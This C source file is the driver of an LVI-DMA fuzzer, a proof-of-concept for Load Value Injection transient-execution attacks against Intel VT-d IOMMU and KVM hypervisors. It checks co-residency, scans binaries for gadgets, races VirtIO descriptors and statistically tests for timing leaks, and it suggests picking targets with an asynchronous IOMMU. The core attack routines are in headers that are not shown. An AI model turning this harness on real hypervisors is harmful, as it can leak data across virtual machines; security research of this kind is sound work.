#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <unistd.h>
#include <getopt.h>
#include <signal.h>
#include <time.h>

#include "timing.h"
#include "cache.h"
#include "affinity.h"
#include "coresidency.h"
#include "virtio.h"
#include "race.h"
#include "bootstrap.h"
#include "gadgets.h"
#include "db.h"

#define DEFAULT_CAMPAIGNS 1
#define DEFAULT_ITERATIONS 10000
#define DEFAULT_TARGET_BINARY "/usr/bin/ls"

typedef struct {
    char target_binary[512];
    uint32_t num_campaigns;
    uint32_t iterations_per_campaign;
    uint32_t bootstrap_rounds;
    double alpha;
    uint64_t negligible_threshold;
    bool verbose;
    bool scan_only;
    char output_db[512];
} fuzzer_config_t;

static volatile bool g_running = true;

static void signal_handler(int sig) {
    (void)sig;
    g_running = false;
    printf("\n[!] Received interrupt, shutting down...\n");
}

static void print_banner(void) {
    printf("\n");
    printf("╔═══════════════════════════════════════════════════════════════╗\n");
    printf("║         LVI-DMA Fuzzer - Intel Transient Execution PoC       ║\n");
    printf("║         Load Value Injection via Direct Memory Access        ║\n");
    printf("║                                                               ║\n");
    printf("║         Target: Intel VT-d IOMMU / KVM Hypervisor            ║\n");
    printf("║         Research Tool for Project Zero / GCP Security        ║\n");
    printf("╚═══════════════════════════════════════════════════════════════╝\n");
    printf("\n");
}

static void print_usage(const char *prog) {
    printf("Usage: %s [OPTIONS]\n\n", prog);
    printf("Options:\n");
    printf("  -b, --binary PATH        Target binary to scan for gadgets (default: /usr/bin/ls)\n");
    printf("  -c, --campaigns N        Number of fuzzing campaigns (default: 1)\n");
    printf("  -i, --iterations N       Iterations per campaign (default: 10000)\n");
    printf("  -r, --bootstrap N        Bootstrap test rounds (default: 10000)\n");
    printf("  -a, --alpha FLOAT        Statistical significance level (default: 0.05)\n");
    printf("  -t, --threshold N        Negligible leak threshold in cycles (default: 50)\n");
    printf("  -o, --output PATH        Output database path (default: lvi-dma-results.csv)\n");
    printf("  -s, --scan-only          Only scan for gadgets, don't fuzz\n");
    printf("  -v, --verbose            Verbose output\n");
    printf("  -h, --help               Show this help message\n\n");
    printf("Example:\n");
    printf("  %s -b /usr/lib/x86_64-linux-gnu/libc.so.6 -c 5 -i 50000 -v\n\n", prog);
}

static bool parse_args(int argc, char **argv, fuzzer_config_t *config) {
    memset(config, 0, sizeof(fuzzer_config_t));

    strncpy(config->target_binary, DEFAULT_TARGET_BINARY, sizeof(config->target_binary) - 1);
    config->num_campaigns = DEFAULT_CAMPAIGNS;
    config->iterations_per_campaign = DEFAULT_ITERATIONS;
    config->bootstrap_rounds = DEFAULT_BOOTSTRAP_ROUNDS;
    config->alpha = DEFAULT_ALPHA;
    config->negligible_threshold = DEFAULT_NEGLIGIBLE_THRESHOLD;
    strncpy(config->output_db, "lvi-dma-results.csv", sizeof(config->output_db) - 1);
    config->verbose = false;
    config->scan_only = false;

    static struct option long_options[] = {
        {"binary",     required_argument, 0, 'b'},
        {"campaigns",  required_argument, 0, 'c'},
        {"iterations", required_argument, 0, 'i'},
        {"bootstrap",  required_argument, 0, 'r'},
        {"alpha",      required_argument, 0, 'a'},
        {"threshold",  required_argument, 0, 't'},
        {"output",     required_argument, 0, 'o'},
        {"scan-only",  no_argument,       0, 's'},
        {"verbose",    no_argument,       0, 'v'},
        {"help",       no_argument,       0, 'h'},
        {0, 0, 0, 0}
    };

    int opt;
    int option_index = 0;

    while ((opt = getopt_long(argc, argv, "b:c:i:r:a:t:o:svh", long_options, &option_index)) != -1) {
        switch (opt) {
            case 'b':
                strncpy(config->target_binary, optarg, sizeof(config->target_binary) - 1);
                break;
            case 'c':
                config->num_campaigns = atoi(optarg);
                break;
            case 'i':
                config->iterations_per_campaign = atoi(optarg);
                break;
            case 'r':
                config->bootstrap_rounds = atoi(optarg);
                break;
            case 'a':
                config->alpha = atof(optarg);
                break;
            case 't':
                config->negligible_threshold = atoll(optarg);
                break;
            case 'o':
                strncpy(config->output_db, optarg, sizeof(config->output_db) - 1);
                break;
            case 's':
                config->scan_only = true;
                break;
            case 'v':
                config->verbose = true;
                break;
            case 'h':
                print_usage(argv[0]);
                return false;
            default:
                print_usage(argv[0]);
                return false;
        }
    }

    return true;
}

static void print_config(fuzzer_config_t *config) {
    printf("[*] Fuzzer Configuration:\n");
    printf("    Target binary:       %s\n", config->target_binary);
    printf("    Campaigns:           %u\n", config->num_campaigns);
    printf("    Iterations/campaign: %u\n", config->iterations_per_campaign);
    printf("    Bootstrap rounds:    %u\n", config->bootstrap_rounds);
    printf("    Alpha (p-value):     %.4f\n", config->alpha);
    printf("    Negligible threshold:%lu cycles\n", config->negligible_threshold);
    printf("    Output database:     %s\n", config->output_db);
    printf("    Scan only:           %s\n", config->scan_only ? "YES" : "NO");
    printf("    Verbose:             %s\n", config->verbose ? "YES" : "NO");
    printf("\n");
}

static bool run_fuzzing_campaign(fuzzer_config_t *config, campaign_t *campaign,
                                  gadget_list_t *gadgets, db_handle_t *db,
                                  timing_calibration_t *cal, iotlb_profile_t *profile) {

    printf("\n[*] Starting campaign: %s\n", campaign->name);

    sample_population_t *leak_pop = population_create(10000);
    sample_population_t *no_leak_pop = population_create(10000);

    if (!leak_pop || !no_leak_pop) {
        return false;
    }

    virtqueue_t *vq = virtio_queue_create(256);
    if (!vq) {
        printf("[-] Failed to create VirtIO queue\n");
        return false;
    }

    volatile uint64_t *probe_memory = aligned_alloc(4096, 4096);
    volatile uint64_t *target_memory = aligned_alloc(4096, 4096);

    memset((void*)probe_memory, 0x00, 4096);
    memset((void*)target_memory, 0xAA, 4096);

    for (uint32_t iter = 0; iter < config->iterations_per_campaign && g_running; iter++) {
        uint32_t gadget_idx = rand() % gadgets->count;
        gadget_t *gadget = &gadgets->gadgets[gadget_idx];

        uint16_t desc_idx;
        if (!virtio_descriptor_prepare_race(vq, (uint64_t)target_memory,
                                             (uint64_t)probe_memory, &desc_idx)) {
            continue;
        }

        race_attempt_t attempt = {0};
        race_outcome_t outcome = race_execute_lvi_attempt(
            vq, desc_idx, (uint64_t)target_memory, (uint64_t)probe_memory,
            profile, cal, &attempt
        );

        if (attempt.leak_detected) {
            population_add(leak_pop, attempt.leak_latency);
            campaign->successful_leaks++;
        } else {
            population_add(no_leak_pop, attempt.leak_latency);
        }

        campaign->total_attempts++;

        if (config->verbose && iter % 1000 == 0) {
            printf("    [%u/%u] Success rate: %.2f%%\r",
                   iter, config->iterations_per_campaign,
                   (double)campaign->successful_leaks / campaign->total_attempts * 100);
            fflush(stdout);
        }

        experiment_t exp = {
            .experiment_id = campaign->total_attempts,
            .campaign_id = campaign->campaign_id,
            .timestamp = time(NULL),
            .gadget_addr = gadget->address,
            .outcome = outcome,
            .leak_detected = attempt.leak_detected,
            .leak_latency = attempt.leak_latency,
            .window_estimate = attempt.window_estimate,
            .p_value = 0.0,
            .statistically_significant = false
        };

        db_experiment_log(db, &exp);
    }

    printf("\n");

    printf("[*] Running statistical validation...\n");

    population_clean_outliers(leak_pop);
    population_clean_outliers(no_leak_pop);

    bootstrap_config_t boot_config = {
        .bootstrap_rounds = config->bootstrap_rounds,
        .alpha = config->alpha,
        .negligible_threshold_cycles = config->negligible_threshold
    };

    bootstrap_result_t boot_result = {0};
    bool exploitable = bootstrap_test(leak_pop, no_leak_pop, &boot_config, &boot_result);

    if (exploitable) {
        printf("\n");
        printf("╔═══════════════════════════════════════════════════════════════╗\n");
        printf("║                  ⚠️  EXPLOITABLE LEAK FOUND  ⚠️                ║\n");
        printf("╚═══════════════════════════════════════════════════════════════╝\n");
        printf("\n");
        printf("[!] Campaign '%s' discovered a statistically significant,\n", campaign->name);
        printf("    exploitable LVI-DMA timing leak!\n\n");
        printf("    Median timing difference: %.2f cycles\n", boot_result.median_diff);
        printf("    95%% Confidence Interval: [%.2f, %.2f]\n",
               boot_result.ci_lower, boot_result.ci_upper);
        printf("    p-value: %.6f (significant at α=%.4f)\n",
               boot_result.p_value, config->alpha);
        printf("\n");
    } else {
        printf("[-] No exploitable leak detected in this campaign\n");
    }

    population_destroy(leak_pop);
    population_destroy(no_leak_pop);
    virtio_queue_destroy(vq);
    free((void*)probe_memory);
    free((void*)target_memory);

    db_campaign_update(db, campaign);

    return exploitable;
}

int main(int argc, char **argv) {
    fuzzer_config_t config;

    print_banner();

    if (!parse_args(argc, argv, &config)) {
        return 1;
    }

    print_config(&config);

    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);

    topology_t *topo = topology_detect();
    topology_print(topo);

    timing_calibration_t cal;
    timing_calibrate(&cal);

    printf("\n[*] Verifying co-residency...\n");
    cooresidency_result_t coresidency;
    if (!coresidency_scan_and_verify(&cal, &coresidency)) {
        printf("[-] FATAL: No co-resident CPUs detected!\n");
        printf("[-] LVI-DMA attacks require shared LLC access.\n");
        printf("[-] This fuzzer cannot proceed without co-residency.\n");
        topology_free(topo);
        return 1;
    }

    printf("\n[*] Scanning for LVI gadgets...\n");
    gadget_list_t *gadgets = gadget_list_create();
    if (!gadget_scan_binary(config.target_binary, gadgets)) {
        printf("[-] No gadgets found in target binary\n");
        gadget_list_destroy(gadgets);
        topology_free(topo);
        return 1;
    }

    gadget_list_print(gadgets);

    if (config.scan_only) {
        printf("\n[*] Scan-only mode: Exiting\n");
        gadget_list_destroy(gadgets);
        topology_free(topo);
        return 0;
    }

    printf("\n[*] Estimating IOTLB invalidation window...\n");
    iotlb_profile_t profile;
    race_estimate_iotlb_window(&profile, 1000);

    if (profile.iotlb_inv_mean < 1000) {
        printf("\n[!] WARNING: IOTLB invalidation window is very narrow (%lu cycles)\n",
               profile.iotlb_inv_mean);
        printf("[!] LVI-DMA attacks may be difficult or impossible.\n");
        printf("[!] Consider targeting a system with asynchronous IOMMU.\n\n");
    }

    db_handle_t *db = db_open(config.output_db);
    if (!db) {
        printf("[-] Failed to open database\n");
        gadget_list_destroy(gadgets);
        topology_free(topo);
        return 1;
    }

    printf("\n");
    printf("╔═══════════════════════════════════════════════════════════════╗\n");
    printf("║              STARTING LVI-DMA FUZZING CAMPAIGN                ║\n");
    printf("╚═══════════════════════════════════════════════════════════════╝\n");
    printf("\n");

    srand(time(NULL));

    bool found_exploitable = false;

    for (uint32_t c = 0; c < config.num_campaigns && g_running; c++) {
        campaign_t campaign = {0};
        snprintf(campaign.name, sizeof(campaign.name), "Campaign_%u", c + 1);
        db_campaign_create(db, &campaign);

        bool exploitable = run_fuzzing_campaign(&config, &campaign, gadgets, db,
                                                  &cal, &profile);

        if (exploitable) {
            found_exploitable = true;
        }

        db_campaign_finalize(db, campaign.campaign_id);

        printf("\n[*] Campaign %u/%u complete\n", c + 1, config.num_campaigns);
        printf("    Total attempts: %u\n", campaign.total_attempts);
        printf("    Successful leaks: %u\n", campaign.successful_leaks);
        printf("    Success rate: %.4f%%\n\n", campaign.success_rate * 100);
    }

    printf("\n");
    printf("╔═══════════════════════════════════════════════════════════════╗\n");
    printf("║                  FUZZING CAMPAIGN COMPLETE                    ║\n");
    printf("╚═══════════════════════════════════════════════════════════════╝\n");
    printf("\n");

    if (found_exploitable) {
        printf("[+] RESULT: Exploitable LVI-DMA vulnerability detected!\n");
        printf("[+] Results saved to: %s\n", config.output_db);
    } else {
        printf("[-] RESULT: No exploitable vulnerability found\n");
        printf("[-] Data logged to: %s\n", config.output_db);
    }

    db_close(db);
    gadget_list_destroy(gadgets);
    topology_free(topo);

    printf("\n[*] Fuzzer shutdown complete\n\n");

    return found_exploitable ? 0 : 2;
}
